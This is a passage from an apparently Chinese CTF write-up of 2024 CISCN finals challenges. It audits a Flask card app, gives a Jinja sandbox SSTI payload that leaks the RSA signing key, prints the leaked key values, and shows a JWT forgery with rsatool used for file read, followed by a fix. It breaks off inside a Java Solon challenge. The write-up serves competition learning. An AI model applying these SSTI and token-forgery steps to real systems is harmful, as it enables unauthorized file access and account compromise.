string">"show.html"</span><span class="token punctuation">,</span> info<span class="token operator">=</span>info<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'create_card'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">8888</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>本地要调试的时候发现给的dist-packages会报错，实际有限制py版本</p><p>先在linux下起一个venv环境，注意要是python3.8的：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python3 <span class="token parameter variable">-m</span> venv <span class="token builtin class-name">test</span><span class="token builtin class-name">source</span> test/bin/activate<span class="token comment">#pip3 install dist-packages.tar.gz</span><span class="token comment"># 上面这个用不了，缺少setup.py</span><span class="token function">tar</span> <span class="token parameter variable">-zxvf</span> dist-packages.tar.gz <span class="token parameter variable">-C</span> dist-packages<span class="token function">cp</span> <span class="token parameter variable">-r</span> dist-packages/* test/lib/python3.8/site-packages/<span class="token builtin class-name">cd</span> srcpython app.py<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>审计代码</p><p>首先是 &#x2F;createCard 路由</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/createCard"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">,</span> <span class="token string">"POST"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">create_card</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">"GET"</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> safer_render_template<span class="token punctuation">(</span><span class="token string">"create.html"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'style'</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'templates/style.css'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'style'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    info<span class="token operator">=</span>Info<span class="token punctuation">(</span><span class="token operator">**</span>request<span class="token punctuation">.</span>form<span class="token punctuation">)</span>    <span class="token keyword">if</span> info<span class="token punctuation">.</span>avatar <span class="token keyword">not</span> <span class="token keyword">in</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span><span class="token string">'avatars'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">raise</span> FileNotFoundError    token <span class="token operator">=</span> jwt<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token builtin">dict</span><span class="token punctuation">(</span>info<span class="token punctuation">)</span><span class="token punctuation">,</span> rsakey<span class="token punctuation">.</span>exportKey<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> algorithm<span class="token operator">=</span><span class="token string">"RS256"</span><span class="token punctuation">)</span>    share_url <span class="token operator">=</span> request<span class="token punctuation">.</span>url_root <span class="token operator">+</span> url_for<span class="token punctuation">(</span><span class="token string">'show_card'</span><span class="token punctuation">,</span> token<span class="token operator">=</span>token<span class="token punctuation">)</span>    qr_img <span class="token operator">=</span> BytesIO<span class="token punctuation">(</span><span class="token punctuation">)</span>    qrcode<span class="token punctuation">.</span>make<span class="token punctuation">(</span>share_url<span class="token punctuation">)</span><span class="token punctuation">.</span>save<span class="token punctuation">(</span>qr_img<span class="token punctuation">,</span><span class="token string">'png'</span><span class="token punctuation">)</span>    qr_img<span class="token punctuation">.</span>seek<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    share_img <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>qr_img<span class="token punctuation">.</span>getvalue<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> safer_render_template<span class="token punctuation">(</span><span class="token string">"created.html"</span><span class="token punctuation">,</span> share_url<span class="token operator">=</span>share_url<span class="token punctuation">,</span> share_img<span class="token operator">=</span>share_img<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240809170450021.png" alt="image-20240809170450021"></p><p>注意到这里可以写入文件：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">if</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'style'</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token boolean">None</span><span class="token punctuation">:</span>    <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'templates/style.css'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'style'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>找一下这个 style.css 文件被导入的地方，在三个 html 里面都有</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240809171936436.png" alt="image-20240809171936436"></p><p>以模板的形式包含文件来导入，然后会用<code>safer_render_template</code>进行渲染</p><p>我们尝试传入一下 style 参数打ssti看看</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240809173222915.png" alt="image-20240809173222915"></p><p>确实存在ssti，但是不能直接payload一把梭，因为这里用的是自定义的<code>safer_render_template</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">safer_render_template</span><span class="token punctuation">(</span>template_name<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>    env <span class="token operator">=</span> SaferSandboxedEnvironment<span class="token punctuation">(</span>loader<span class="token operator">=</span>current_app<span class="token punctuation">.</span>jinja_env<span class="token punctuation">.</span>loader<span class="token punctuation">)</span>    <span class="token keyword">return</span> env<span class="token punctuation">.</span>from_string<span class="token punctuation">(</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'templates/'</span><span class="token operator">+</span>template_name<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>render<span class="token punctuation">(</span><span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>可以看到开了个沙盒</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">SaferSandboxedEnvironment</span><span class="token punctuation">(</span>SandboxedEnvironment<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">is_safe_attribute</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> obj<span class="token punctuation">,</span> attr<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span> value<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bool</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">def</span> <span class="token function">is_safe_callable</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> obj<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bool</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里设置成能够访问属性，但是不能调用，给沙盒拦了</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240809173315191.png" alt="image-20240809173315191"></p><p>怎么办呢？继续审计代码</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Info</span><span class="token punctuation">(</span>BaseModel<span class="token punctuation">)</span><span class="token punctuation">:</span>    name<span class="token punctuation">:</span> <span class="token builtin">str</span>    avatar<span class="token punctuation">:</span> <span class="token builtin">str</span>    signature<span class="token punctuation">:</span> <span class="token builtin">str</span>    <span class="token keyword">def</span> <span class="token function">parse_avatar</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>avatar <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'avatars/'</span><span class="token operator">+</span>self<span class="token punctuation">.</span>avatar<span class="token punctuation">,</span><span class="token string">'rb'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>明显这里存在一个文件读取，看一下<code>parse_avatar</code>调用的位置：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/showCard"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show_card</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    token <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"token"</span><span class="token punctuation">)</span>    data <span class="token operator">=</span> jwt<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>token<span class="token punctuation">,</span> rsakey<span class="token punctuation">.</span>publickey<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>exportKey<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> algorithms<span class="token operator">=</span>jwt<span class="token punctuation">.</span>algorithms<span class="token punctuation">.</span>get_default_algorithms<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    info <span class="token operator">=</span> Info<span class="token punctuation">(</span><span class="token operator">**</span>data<span class="token punctuation">)</span>    info<span class="token punctuation">.</span>parse_avatar<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> safer_render_template<span class="token punctuation">(</span><span class="token string">"show.html"</span><span class="token punctuation">,</span> info<span class="token operator">=</span>info<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在 &#x2F;showCard 路由下</p><p>我们正常生成一个二维码之后点击二维码就可以跳转到 &#x2F;showcard 下，同时后面会跟一串token</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240809174116052.png" alt="image-20240809174116052"></p><p>一眼jwt，解码一下看看</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240809174228055.png" alt="image-20240809174228055"></p><p>相关的生成代码：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">rsakey <span class="token operator">=</span> RSA<span class="token punctuation">.</span>generate<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>info<span class="token operator">=</span>Info<span class="token punctuation">(</span><span class="token operator">**</span>request<span class="token punctuation">.</span>form<span class="token punctuation">)</span>    <span class="token keyword">if</span> info<span class="token punctuation">.</span>avatar <span class="token keyword">not</span> <span class="token keyword">in</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span><span class="token string">'avatars'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">raise</span> FileNotFoundError    token <span class="token operator">=</span> jwt<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token builtin">dict</span><span class="token punctuation">(</span>info<span class="token punctuation">)</span><span class="token punctuation">,</span> rsakey<span class="token punctuation">.</span>exportKey<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> algorithm<span class="token operator">=</span><span class="token string">"RS256"</span><span class="token punctuation">)</span>    share_url <span class="token operator">=</span> request<span class="token punctuation">.</span>url_root <span class="token operator">+</span> url_for<span class="token punctuation">(</span><span class="token string">'show_card'</span><span class="token punctuation">,</span> token<span class="token operator">=</span>token<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>由于<code>if info.avatar not in os.listdir(&#39;avatars&#39;)</code>的存在，导致我们不能直接在 avatar 参数上进行目录穿越</p><p>那么考虑 jwt 伪造 avatar 的值，但是这里jwt的key是rsa生成的，我们需要想办法得到 rsakey</p><p>这时候就又想到前面的 ssti 了，虽然不能直接调用，但是可以访问属性，我们可以利用这一点获取rsakey</p><p>现在想办法在沙盒内拿到一个全局属性，注意到<code>return safer_render_template(&quot;created.html&quot;, share_url=share_url, share_img=share_img)</code>，意味着我们可以用<code>share_url</code>或者<code>share_img</code>来获取属性，同理下面的<code>info</code>也可以</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240809180407291.png" alt="image-20240809180407291"></p><p>这里的话要取 info 的属性，因为 info 是调用<code>Info</code>类得到的，Info类下有<code>parse_avatar</code>这个全局方法，然后需要在 &#x2F;showCard 路由下查看style，因为这里才有info，而 &#x2F;createCard 则会报错但没关系</p><p>那么读rsakey</p><pre class="line-numbers language-django" data-language="django"><code class="language-django"><span class="token django language-django"><span class="token delimiter punctuation">&#123;&#123;</span><span class="token variable">info</span><span class="token punctuation">.</span><span class="token variable">__class__</span><span class="token punctuation">.</span><span class="token variable">parse_avatar</span><span class="token punctuation">.</span><span class="token variable">__globals__</span><span class="token punctuation">.</span><span class="token variable">rsakey</span><span class="token punctuation">.</span><span class="token variable">__dict__</span><span class="token delimiter punctuation">&#125;&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240809181611924.png" alt="image-20240809181611924"></p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>'_n'<span class="token operator">:</span> Integer(<span class="token number">126123614477015775448789877206017292386336663012480330606083697181136984617708780170725665068837288536687956308850816616924015665300736823691410985286499563938666378049277495278535134451022151639249605836868202071595881433292992822004089702149441937221323083043604617381139486807424885868287782232845765278943</span>)<span class="token punctuation">,</span>'_e'<span class="token operator">:</span> Integer(<span class="token number">65537</span>)<span class="token punctuation">,</span>'_d'<span class="token operator">:</span> Integer(<span class="token number">16356021780675909418180038243647725223789238124159945219053440687588434506704715239803430541832066088977385914352550321608209242708561000115252482779955744104485540020656221986885376506975459291207812710017083944289037938520247378083893059236195153243903078926446378766613488506330804090368443881290180527489</span>)<span class="token punctuation">,</span>'_p'<span class="token operator">:</span> Integer(<span class="token number">9850363198422246262285117823658498388221798522562304025833696072510450569943633244157099881440406495235906124442860453293788140178008982726677547045673409</span>)<span class="token punctuation">,</span>'_q'<span class="token operator">:</span> Integer(<span class="token number">12803955746242662857848752418436052334358986979076848017812570866767671055374254584876363536051804158817416040437466027033560595225841364508826493617684127</span>)<span class="token punctuation">,</span>'_u'<span class="token operator">:</span> Integer(<span class="token number">10145018723854556278558667216207587332906644078393923017778188994804203848464400278734625183772210928560743734943678326043651170472880674685079284970854903</span>)<span class="token punctuation">,</span>'_dp'<span class="token operator">:</span> Integer(<span class="token number">999961340297895911973127986950882551487550934138074807877558935721989527165341592892216389386499601947060186549862682084373292897207589027275977241785025</span>)<span class="token punctuation">,</span>'_dq'<span class="token operator">:</span> Integer(<span class="token number">5244118286473985022664696467883188378455894052098520751546836553485478835899655790885322032358858770327861839227039124427954186139921478037534838971662989</span>)<span class="token punctuation">,</span>'_invq'<span class="token operator">:</span> None<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>接下来我们要做的是生成一个rsa私钥，使用工具：<a href="https://github.com/ius/rsatool">https://github.com/ius/rsatool</a></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python3 rsatool.py <span class="token parameter variable">-f</span> PEM <span class="token parameter variable">-o</span> private.pem <span class="token parameter variable">-n</span> <span class="token number">126123614477015775448789877206017292386336663012480330606083697181136984617708780170725665068837288536687956308850816616924015665300736823691410985286499563938666378049277495278535134451022151639249605836868202071595881433292992822004089702149441937221323083043604617381139486807424885868287782232845765278943</span> <span class="token parameter variable">-d</span> <span class="token number">16356021780675909418180038243647725223789238124159945219053440687588434506704715239803430541832066088977385914352550321608209242708561000115252482779955744104485540020656221986885376506975459291207812710017083944289037938520247378083893059236195153243903078926446378766613488506330804090368443881290180527489</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>得到私钥，于是伪造jwt</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240809184225259.png" alt="image-20240809184225259"></p><p>带回token，得到base64编码后flag</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240809184249085.png" alt="image-20240809184249085"></p><hr><h3 id="fix-1"><a href="#fix-1" class="headerlink" title="fix"></a>fix</h3><p>本题由@Laffey修复</p><p>加盐</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/createCard"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">,</span> <span class="token string">"POST"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">create_card</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">"GET"</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> safer_render_template<span class="token punctuation">(</span><span class="token string">"create.html"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'style'</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'templates/style.css'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'style'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    info<span class="token operator">=</span>Info<span class="token punctuation">(</span><span class="token operator">**</span><span class="token punctuation">&#123;</span><span class="token string">'name'</span><span class="token punctuation">:</span>request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">'avatar'</span><span class="token punctuation">:</span>request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'avatar'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">'signature'</span><span class="token punctuation">:</span>request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'signature'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">'salt'</span><span class="token punctuation">:</span><span class="token builtin">str</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token comment">#</span>    <span class="token keyword">if</span> <span class="token string">'&#123;'</span> <span class="token keyword">in</span> info<span class="token punctuation">.</span>name<span class="token operator">+</span>info<span class="token punctuation">.</span>avatar<span class="token operator">+</span>info<span class="token punctuation">.</span>signature <span class="token keyword">or</span> <span class="token string">'&#125;'</span> <span class="token keyword">in</span> info<span class="token punctuation">.</span>name<span class="token operator">+</span>info<span class="token punctuation">.</span>avatar<span class="token operator">+</span>info<span class="token punctuation">.</span>signature<span class="token punctuation">:</span>        <span class="token keyword">raise</span> Exception    <span class="token comment">#</span>    <span class="token keyword">if</span> info<span class="token punctuation">.</span>avatar <span class="token keyword">not</span> <span class="token keyword">in</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span><span class="token string">'avatars'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">raise</span> FileNotFoundError    token <span class="token operator">=</span> jwt<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token builtin">dict</span><span class="token punctuation">(</span>info<span class="token punctuation">)</span><span class="token punctuation">,</span> rsakey<span class="token punctuation">.</span>exportKey<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> algorithm<span class="token operator">=</span><span class="token string">"RS256"</span><span class="token punctuation">)</span>    share_url <span class="token operator">=</span> request<span class="token punctuation">.</span>url_root <span class="token operator">+</span> url_for<span class="token punctuation">(</span><span class="token string">'show_card'</span><span class="token punctuation">,</span> token<span class="token operator">=</span>token<span class="token punctuation">)</span>    qr_img <span class="token operator">=</span> BytesIO<span class="token punctuation">(</span><span class="token punctuation">)</span>    qrcode<span class="token punctuation">.</span>make<span class="token punctuation">(</span>share_url<span class="token punctuation">)</span><span class="token punctuation">.</span>save<span class="token punctuation">(</span>qr_img<span class="token punctuation">,</span><span class="token string">'png'</span><span class="token punctuation">)</span>    qr_img<span class="token punctuation">.</span>seek<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    share_img <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>qr_img<span class="token punctuation">.</span>getvalue<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> safer_render_template<span class="token punctuation">(</span><span class="token string">"created.html"</span><span class="token punctuation">,</span> share_url<span class="token operator">=</span>share_url<span class="token punctuation">,</span> share_img<span class="token operator">=</span>share_img<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>貌似这个算非预期（？</p><p>看别的师傅是写ssti waf</p><hr><h2 id="SolonMaster"><a href="#SolonMaster" class="headerlink" title="SolonMaster"></a>SolonMaster</h2><p>就一个控制器DemoController</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>demo</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>demo<span class="token punctuation">.</span></span><span class="token class-name">User</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">BufferedReader</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ByteArrayInputStream</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">FileReader</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectInputStream</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectStreamClass</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Base64</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>management<span class="token punctuation">.</span></span><span class="token class-name">BadAttributeValueExpException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>json<span class="token punctuation">.</span></span><span class="token class-name">JSONObject</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>noear<span class="token punctuation">.</span>solon<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Controller</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>noear<span class="token punctuation">.</span>solon<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Mapping</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>noear<span class="token punctuation">.</span>solon<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Post</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>noear<span class="token punctuation">.</span>solon<span class="token punctuation">.</span>core<span class="token punctuation">.</span>handle<span class="token punctuation">.</span></span><span class="token class-name">Context</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>noear<span class="token punctuation">.</span>solon<span class="token punctuation">.</span>core<span class="token punctuation">.</span>handle<span class="token punctuation">.</span></span><span class="token class-name">ModelAndView</span></span><span class="token punctuation">;</span><span class="token annotation punctuation">@Controller</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">DemoController</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Mapping</span><span class="token punctuation">(</span>value<span class="token operator">=</span><span class="token string">"/"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token class-name">ModelAndView</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">ModelAndView</span> model <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ModelAndView</span><span class="token punctuation">(</span><span class="token string">"freemarker.ftl"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        model<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"msg"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token class-name">Object</span><span class="token punctuation">)</span><span class="token string">"/api"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> model<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/*     * WARNING - Removed try catching itself - possible behaviour change.     */</span>    <span class="token annotation punctuation">@Mapping</span><span class="token punctuation">(</span>value<span class="token 